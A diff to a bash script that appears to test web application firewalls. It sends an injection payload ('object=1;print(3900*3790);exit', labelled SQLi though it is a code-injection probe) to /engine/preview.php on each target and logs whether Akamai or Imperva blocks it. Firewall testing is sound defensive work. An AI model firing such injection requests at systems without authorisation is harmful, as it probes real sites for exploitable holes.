@@ -83,3 +83,30 @@ lineip=$(dig +short $linehost)
 	fi
 	echo "=========="
 	echo ""
+
+# SQLi 1
+	echo "=========="
+	echo "SQLi 1"
+	echo "Launching SQLi 1 against " $line"/session"
+
+	# Reset the timestamp to the current time and use PST
+	timestamp=$(TZ=":America/Los_Angeles" date)
+
+	if curl -v -s -X POST $line"/engine/preview.php" -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" -H 'Pragma: no-cache' -H "Origin: $line" -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Referer: $line/login' -H 'Connection: keep-alive' --data "object=1;print(3900*3790);exit" --compressed --stderr - | grep "403 Forbidden" &> /dev/null; then
+    
+    	echo "SQLi 1 completed"
+        echo "Attack Status: Blocked by Akamai"
+        echo -e "$timestamp \t $line \t SQLi 1 \t \t x \t " >> $file
+        
+    elif curl -v -s -X POST $line"/engine/preview.php" -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" -H 'Pragma: no-cache' -H "Origin: $line" -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: no-cache' -H 'Referer: $line/login' -H 'Connection: keep-alive' --data "object=1;print(3900*3790);exit" --compressed --stderr - | grep "Your request has been blocked" &> /dev/null; then
+
+    	echo "SQLi 1 completed"
+        echo "Attack Status: Blocked by Imperva"
+        echo -e "$timestamp \t $line \t SQLi 1 \t x \t \t " >> $file
+	else
+		echo "SQLi 1 completed"
+		echo "Attack Status: Undetected"
+		echo -e "$timestamp \t $line \t SQLi 1 \t \t \t x" >> $file
+	fi
+	echo "=========="
+	echo ""
